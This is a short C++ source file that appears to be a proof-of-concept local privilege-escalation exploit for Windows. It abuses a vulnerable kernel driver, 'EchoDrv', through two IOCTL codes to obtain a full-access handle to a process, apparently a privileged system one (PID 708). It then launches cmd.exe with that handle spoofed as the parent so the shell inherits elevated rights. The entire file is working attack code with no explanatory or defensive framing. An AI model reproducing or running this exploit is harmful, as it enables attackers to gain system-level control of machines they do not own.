#include <windows.h>
#include <iostream>

#define DEVICE_NAME L"\\\\.\\EchoDrv" 
#define IOCTL_CODE 0x9E6A0594
#define IOCTL_CODE2 0xE6224248

typedef struct _OpenPIDStruct {
    DWORD PID;
    ACCESS_MASK ACCESS;
    HANDLE HAND;
    ULONG RETURNCODE;

} OpenPIDStruct, * pOpenPIDStruct;

BOOL CreateProcessWithParent(char* cmd, HANDLE parent)
{
    SIZE_T ptsize = 0;
    PROCESS_INFORMATION pi;
    STARTUPINFOEXA si;
    LPPROC_THREAD_ATTRIBUTE_LIST ptal;
    BOOL ret;

    InitializeProcThreadAttributeList(NULL, 1, 0, &ptsize);
    ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, ptsize);
    if (!ptal)
    {
        return FALSE;
    }
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    if (!InitializeProcThreadAttributeList(ptal, 1, 0, &ptsize))
    {
        return FALSE;
    }
    if (!UpdateProcThreadAttribute(ptal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent, sizeof(HANDLE), NULL, NULL))
    {
        return FALSE;
    }
    si.lpAttributeList = ptal;
    ret = CreateProcessA(NULL, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (STARTUPINFOA*)&si, &pi);
    DeleteProcThreadAttributeList(ptal);
    HeapFree(GetProcessHeap(), 0, ptal);
    if (ret)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ret;
}


int main() {
    HANDLE hDevice;
    DWORD bytesReturned;

    

    OpenPIDStruct input;
    char outputBuffer[4096];
    
    size_t outputBufferSize = sizeof(outputBuffer);

    // Open a handle to the device driver
    hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open device: " << GetLastError() << std::endl;
        return 1;
    }

    // Call DeviceIoControl
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_CODE,
        NULL,
        NULL,
        outputBuffer,
        4096,
        &bytesReturned,
        NULL
    );

    input.PID = 708;
    input.ACCESS = PROCESS_ALL_ACCESS;
    input.HAND = NULL;
    input.RETURNCODE = 0;

    BOOL result1 = DeviceIoControl(
        hDevice,
        IOCTL_CODE2,
        &input,
        sizeof(input),
        &input,
        sizeof(input),
        &bytesReturned,
        NULL
    );

    if (!result1) {
        std::cerr << "DeviceIoControl failed: " << GetLastError() << std::endl;
    }
    else {
        std::cout << "DeviceIoControl succeeded, " << bytesReturned << " bytes returned." << std::endl;
        
    }
    if (input.HAND)
    {
        getchar();
        char command[] = "cmd.exe";
        CreateProcessWithParent(command, input.HAND);
        CloseHandle(input.HAND);
        
        
    }    // Close the device handle
    CloseHandle(hDevice);
    return 0;
}
